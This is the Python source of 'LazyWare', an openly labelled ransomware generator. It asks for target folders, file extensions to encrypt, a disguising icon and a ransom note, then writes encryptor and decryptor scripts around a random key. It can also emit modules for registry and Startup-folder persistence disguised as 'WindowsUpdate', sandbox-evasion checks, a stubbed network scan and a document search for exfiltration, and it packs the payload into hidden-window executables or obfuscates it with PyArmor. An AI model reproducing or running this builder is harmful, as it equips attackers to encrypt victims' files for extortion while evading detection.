import os
import platform
import base64
import datetime
import shutil
import json
import subprocess
from colorama import Fore

red = Fore.RED
green = Fore.GREEN
yellow = Fore.YELLOW
blue = Fore.BLUE
white = Fore.WHITE


class Generator:
	def __init__(self):
		self.configuration = {}
		self.configuration['key'] = base64.urlsafe_b64encode(os.urandom(32)).decode('utf-8')
		self.configuration['disk'] = []
		self.configuration['fname'] = ""
		self.configuration['ext'] = ""
		self.configuration['icon'] = ""
		self.configuration['t_ext'] = []
		self.configuration['readme'] = ""
		self.configuration['advanced_features'] = False
		self.configuration['build_exe'] = False

		self.interact()
		self.createFile()

	def clear(self):
		operating_system = platform.system()
		if "indows" in operating_system:
			os.system("cls")	
		elif "inux" in operating_system:
			os.system("clear")
		else:
			pass


		print(f"""{red}
       @@@@@@@@@@@@@@@@@@
     @@@@@@@@@@@@@@@@@@@@@@@
   @@@@@@@@@@@@@@@@@@@@@@@@@@@
  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@
 @@@@@@@@@@@@@@@/      \@@@/   @
@@@@@@@@@@@@@@@@\      @@  @___@    
@@@@@@@@@@@@@ @@@@@@@@@@  | \@@@@@
@@@@@@@@@@@@@ @@@@@@@@@\__@_/@@@@@
 @@@@@@@@@@@@@@@/,/,/./'/_|.\'\,\\
   @@@@@@@@@@@@@|  | | | | | | | |
        ver 2.0  \_|_|_|_|_|_|_|_|

{white}LazyWare - Advanced Ransomware Generator 
	by {red}@justakazh

{white}({red}*{white}) Disclaimer {white} : This tool is for educational purposes only! I am not responsible for any harmful actions taken with this tool. Use responsibly!

""")
	
	def safe_input(self, prompt):
		"""Sichere Eingabe mit Encoding-Handling"""
		try:
			user_input = input(prompt)
			return user_input.encode('utf-8', errors='ignore').decode('utf-8')
		except Exception as e:
			print(f"Input error: {e}")
			return ""

	def interact(self):
		self.clear()

		# target disk / dir
		print(f"[{red}REQUIRED{white}] Insert disk or target folder\nexample: C:\\\\Users\\\\\n")
		tdisk = self.safe_input("-> ")
		self.configuration['disk'] = [tdisk.strip()]

		self.clear()

		# Ransom name
		print(f"[{red}REQUIRED{white}] Insert Filename\nexample: prize\n")
		self.configuration['fname'] = self.safe_input("-> ")

		# Extension
		print(f"[{red}REQUIRED{white}] Insert extension for encrypted files\nexample: .encrypted\n")
		self.configuration['ext'] = self.safe_input("-> ")

		self.clear()

		# Icon
		print(f"[{red}REQUIRED{white}] Insert Icon\nexample: icons/pdf.ico\n")
		self.configuration['icon'] = self.safe_input("-> ")

		self.clear()

		# Target extension
		print(f"[{red}REQUIRED{white}] Insert target file extension\nexample: .docx,.pdf,.jpg,.mp4\n")
		target_ext = self.safe_input("-> ")
		self.configuration['t_ext'] = [ext.strip() for ext in target_ext.split(",")]

		self.clear()

		# Readme
		print(f"[{red}REQUIRED{white}] Insert readme file\nexample: lib/readme.txt\n")
		r_in = self.safe_input("-> ")
		try:
			with open(r_in, "r", encoding='utf-8', errors='ignore') as f:
				self.configuration['readme'] = f.read()
		except Exception as e:
			print(f"Error reading readme file: {e}")
			self.configuration['readme'] = "Your files have been encrypted!\nPay to get them back."

		self.clear()

		# Advanced Features
		print(f"[{yellow}ADVANCED{white}] Enable advanced features? (y/n)")
		print(f"{yellow}Includes: Persistence, Anti-Analysis, Network Propagation, Data Exfiltration{white}")
		advanced_choice = self.safe_input("-> ").lower()
		self.configuration['advanced_features'] = advanced_choice in ['y', 'yes']

		self.clear()

		# EXE Building
		print(f"[{yellow}BUILD{white}] Build EXE files with PyInstaller? (y/n)")
		print(f"{yellow}Creates standalone executables{white}")
		exe_choice = self.safe_input("-> ").lower()
		self.configuration['build_exe'] = exe_choice in ['y', 'yes']

	def create_advanced_modules(self, target_dir):
		"""Erstelle erweiterte Module im Target Directory"""
		advanced_dir = os.path.join(target_dir, 'advanced')
		os.makedirs(advanced_dir, exist_ok=True)
		
		# Persistence Manager
		persistence_code = '''import os
import sys
import shutil

class PersistenceManager:
    def __init__(self):
        self.persistence_methods = []
    
    def registry_persistence(self):
        """Windows Registry Autostart"""
        try:
            import winreg
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run"
            
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE) as reg_key:
                winreg.SetValueEx(reg_key, "WindowsUpdate", 0, winreg.REG_SZ, sys.argv[0])
            self.persistence_methods.append("registry")
            return True
        except Exception as e:
            return False
    
    def startup_folder_persistence(self):
        """Startup Folder Placement"""
        try:
            startup_path = os.path.join(
                os.environ['APPDATA'], 
                'Microsoft', 'Windows', 'Start Menu', 
                'Programs', 'Startup', 
                'WindowsUpdate.exe'
            )
            
            if not os.path.exists(startup_path):
                shutil.copy2(sys.argv[0], startup_path)
                self.persistence_methods.append("startup_folder")
                return True
        except:
            pass
        return False
    
    def enable_all_persistence(self):
        """Aktiviere alle Persistence-Methoden"""
        print("[*] Enabling persistence mechanisms...")
        
        methods = [
            self.registry_persistence,
            self.startup_folder_persistence
        ]
        
        for method in methods:
            try:
                method()
            except:
                continue
        
        print(f"[+] Active persistence methods: {self.persistence_methods}")
        return self.persistence_methods
'''
		with open(os.path.join(advanced_dir, 'persistence.py'), 'w') as f:
			f.write(persistence_code)

		# Anti-Analysis
		anti_analysis_code = '''import os
import platform

class AntiAnalysis:
    def __init__(self):
        self.detection_flags = []
    
    def check_system_resources(self):
        """Check for low resources (sandbox indicator)"""
        try:
            import psutil
            
            # Check CPU cores
            cpu_cores = psutil.cpu_count()
            if cpu_cores and cpu_cores < 2:
                self.detection_flags.append("low_cpu_cores")
                return True
            
            # Check RAM
            memory = psutil.virtual_memory()
            if memory.total < 2 * 1024**3:  # Less than 2GB
                self.detection_flags.append("low_ram")
                return True
                
        except:
            pass
        return False
    
    def check_username(self):
        """Check for common sandbox usernames"""
        suspicious_users = ['sandbox', 'test', 'user', 'admin', 'vmware']
        try:
            username = os.getenv('USERNAME', '').lower()
            if any(sus_user in username for sus_user in suspicious_users):
                self.detection_flags.append(f"suspicious_user_{username}")
                return True
        except:
            pass
        return False
    
    def should_execute(self):
        """Determine if execution should proceed"""
        print("[*] Running anti-analysis checks...")
        
        checks = [
            self.check_system_resources,
            self.check_username
        ]
        
        suspicious_count = 0
        for check in checks:
            if check():
                suspicious_count += 1
        
        # If any suspicious indicators, don't execute
        if suspicious_count > 0:
            print(f"[-] Analysis environment detected. Flags: {self.detection_flags}")
            return False
        
        print(f"[+] Environment check passed.")
        return True
'''
		with open(os.path.join(advanced_dir, 'anti_analysis.py'), 'w') as f:
			f.write(anti_analysis_code)

		# Network Propagation
		network_code = '''import os
import socket

class NetworkPropagator:
    def __init__(self, ransomware_path):
        self.ransomware_path = ransomware_path
        self.network_hosts = []
    
    def scan_local_network(self):
        """Scan local network for hosts"""
        print("[*] Scanning local network for hosts...")
        
        # Simple localhost scan for testing
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex(("127.0.0.1", 445))
            sock.close()
            
            if result == 0:
                self.network_hosts.append("127.0.0.1")
        except:
            pass
        
        print(f"[*] Found {len(self.network_hosts)} hosts")
        return self.network_hosts
    
    def propagate(self):
        """Main propagation method"""
        print("[*] Starting network propagation...")
        
        # Scan network
        hosts = self.scan_local_network()
        
        if not hosts:
            print("[-] No hosts found for propagation")
            return False
        
        print("[+] Network propagation simulation completed")
        return True
'''
		with open(os.path.join(advanced_dir, 'network_propagation.py'), 'w') as f:
			f.write(network_code)

		# Data Exfiltration
		exfiltration_code = '''import os
import glob

class DataExfiltrator:
    def __init__(self):
        self.sensitive_locations = [
            os.path.expanduser("~\\\\Documents"),
            os.path.expanduser("~\\\\Desktop"), 
            os.path.expanduser("~\\\\Downloads"),
        ]
        
        self.sensitive_extensions = [
            '.pdf', '.doc', '.docx', '.xls', '.xlsx',
            '.txt', '.csv', '.jpg', '.jpeg', '.png'
        ]
    
    def find_sensitive_files(self, max_files=50):
        """Find sensitive files"""
        print("[*] Searching for sensitive files...")
        sensitive_files = []
        
        for location in self.sensitive_locations:
            if not os.path.exists(location):
                continue
                
            for extension in self.sensitive_extensions:
                pattern = os.path.join(location, "**", f"*{extension}")
                try:
                    files = glob.glob(pattern, recursive=True)
                    for file_path in files:
                        if os.path.isfile(file_path) and len(sensitive_files) < max_files:
                            sensitive_files.append(file_path)
                except:
                    continue
        
        print(f"[*] Found {len(sensitive_files)} sensitive files")
        return sensitive_files
    
    def exfiltrate_data(self):
        """Main exfiltration method"""
        print("[*] Starting data exfiltration simulation...")
        
        # Find sensitive files
        sensitive_files = self.find_sensitive_files()
        
        if not sensitive_files:
            print("[-] No sensitive files found")
            return False
        
        print(f"[+] Data exfiltration simulation completed - Found {len(sensitive_files)} files")
        return True
'''
		with open(os.path.join(advanced_dir, 'data_exfiltration.py'), 'w') as f:
			f.write(exfiltration_code)

		print(f"[+] Created advanced modules in: {advanced_dir}")

	def build_exe(self, python_script_path, output_name):
		"""Baut EXE aus Python Script"""
		try:
			print(f"[*] Building EXE: {output_name}")
			
			# PyInstaller command
			cmd = [
				'pyinstaller',
				'--onefile',
				'--noconsole',
				'--clean',
				'--noupx',
				f'--name={output_name}',
				'--distpath=./temp_exe_build',
				python_script_path
			]
			
			# Führe PyInstaller aus
			result = subprocess.run(cmd, capture_output=True, text=True)
			
			if result.returncode == 0:
				exe_source = f"./temp_exe_build/{output_name}"
				exe_dest = os.path.join(os.path.dirname(python_script_path), f"{output_name}")	
				if not exe_source.endswith('.exe') and not exe_source.endswith('.bin'):
				    exe_source += '.exe' if os.name == 'nt' else ''
				    exe_dest += '.exe' if os.name == 'nt' else ''
				if os.path.exists(exe_source):
					shutil.move(exe_source, exe_dest)
					print(f"[+] EXE created: {exe_dest}")
					return True
			else:
				print(f"[-] EXE build failed: {result.stderr}")
				return False
				
		except Exception as e:
			print(f"[-] EXE build error: {e}")
			return False
		finally:
			# Cleanup
			shutil.rmtree("./temp_exe_build", ignore_errors=True)
			shutil.rmtree("./build", ignore_errors=True)
			if os.path.exists(f"./{output_name}.spec"):
				os.remove(f"./{output_name}.spec")

	def createFile(self):
		pwd = os.getcwd()
		date = str(datetime.datetime.now().date())
		fout = os.path.join(pwd, "output", date)
		f_encryptor = fout+"/"+self.configuration['fname']+".py"
		f_decryptor = fout+"/decryptor_"+self.configuration['fname']+".py"
		
		print(f"[*] Creating output directory: {fout}")
		
		try:
			os.makedirs("output", exist_ok=True)
			os.makedirs(fout, exist_ok=True)
			print(f"[+] Output directory created: {fout}")
		except Exception as e:
			print(f"[-] Directory creation error: {e}")
			return

		# ERWEITERTE MODULE ERSTELLEN
		if self.configuration['advanced_features']:
			print("[*] Creating advanced modules...")
			self.create_advanced_modules(fout)

		# GENERATE ENCRYPTOR
		try:
			with open("lib/source.py", "r", encoding='utf-8') as f:
				read = f.read()
				cofig = read.replace("##key##", self.configuration['key'])
				cofig = cofig.replace("##disk##", str(self.configuration['disk']))
				cofig = cofig.replace("##enc_extension##", str(self.configuration['ext']))
				cofig = cofig.replace("##file_to_enc##", str(self.configuration['t_ext']))
				readme_escaped = self.configuration['readme'].replace('"', '\\"').replace('\n', '\\n')
				cofig = cofig.replace("##readme##", readme_escaped)				
				with open(f_encryptor, "w", encoding='utf-8') as f_out:
					f_out.write(cofig)
				print(f"[+] Encryptor created: {f_encryptor}")
		except Exception as e:
			print(f"[-] Encryptor creation error: {e}")
			return

		# GENERATE DE-ENCRYPTOR
		try:
			with open("lib/source_de.py", "r", encoding='utf-8') as f:
				read = f.read()
				cofig = read.replace("##key##", self.configuration['key'])
				cofig = cofig.replace("##disk##", str(self.configuration['disk']))
				cofig = cofig.replace("##enc_extension##", str(self.configuration['ext']))
				cofig = cofig.replace("##file_to_enc##", str(self.configuration['t_ext']))
				
				with open(f_decryptor, "w", encoding='utf-8') as f_out:
					f_out.write(cofig)
				print(f"[+] Decryptor created: {f_decryptor}")
		except Exception as e:
			print(f"[-] Decryptor creation error: {e}")
			return

		# GENERATE KEY
		try:
			key_file = fout+"/"+"KEY.txt"
			with open(key_file, "w", encoding='utf-8') as f:
				f.write(self.configuration['key'])
			print(f"[+] Key file created: {key_file}")
		except Exception as e:
			print(f"[-] Key file error: {e}")

		# EXE BUILDING
		if self.configuration['build_exe']:
			try:
				print("[*] Building EXE files with PyInstaller...")
				
				# Build encryptor EXE
				encryptor_exe_name = self.configuration['fname']
				encryptor_success = self.build_exe(f_encryptor, encryptor_exe_name)
				
				# Build decryptor EXE  
				decryptor_exe_name = f"decryptor_{self.configuration['fname']}"
				decryptor_success = self.build_exe(f_decryptor, decryptor_exe_name)
				
				if encryptor_success and decryptor_success:
					print("[+] EXE building completed")
				else:
					print("[-] EXE building partially failed")
					
			except Exception as e:
				print(f"[-] EXE building error: {e}")
		
		# PYARMOR (Fallback wenn EXE Building nicht gewünscht)
		else:
			try:
				print("[*] Using PyArmor for obfuscation...")
				# init pyarmor config
				os.system(f"pyarmor gen --pack onefile {f_decryptor} --output {fout} 2>/dev/null")
				os.system(f"pyarmor gen --pack onefile {f_encryptor} --output {fout} 2>/dev/null")
				print("[+] PyArmor completed")
			except Exception as e:
				print(f"[-] PyArmor error: {e}")

		# CLEAR TEMPORARY FILES AND DIRECTORY
		try:
			temp_files = [
				f"./{self.configuration['fname']}.spec",
				f"./decryptor_{self.configuration['fname']}.spec"
			]
			
			temp_dirs = ["./dist", "./.pyarmor", "./build", "./temp_exe_build"]
			
			for temp_file in temp_files:
				if os.path.exists(temp_file):
					os.remove(temp_file)
					print(f"[+] Removed: {temp_file}")
			
			for temp_dir in temp_dirs:
				if os.path.exists(temp_dir):
					shutil.rmtree(temp_dir, ignore_errors=True)
					print(f"[+] Removed: {temp_dir}")
					
		except Exception as e:
			print(f"[-] Cleanup error: {e}")

		# FINAL OUTPUT
		self.clear()
		feature_status = "ENABLED" if self.configuration['advanced_features'] else "DISABLED"
		exe_status = "ENABLED" if self.configuration['build_exe'] else "DISABLED"
		
		print(f"""
\n\n\n
\t\t {red}KEY 	: {green}{self.configuration['key']}
\t\t {red}Output : {green}{fout}
\t\t {red}Advanced Features : {green}{feature_status}
\t\t {red}EXE Building : {green}{exe_status}
\n\t\t {yellow}Please dont lose the KEY !
{white}""")

if __name__ == "__main__":
	Generator()
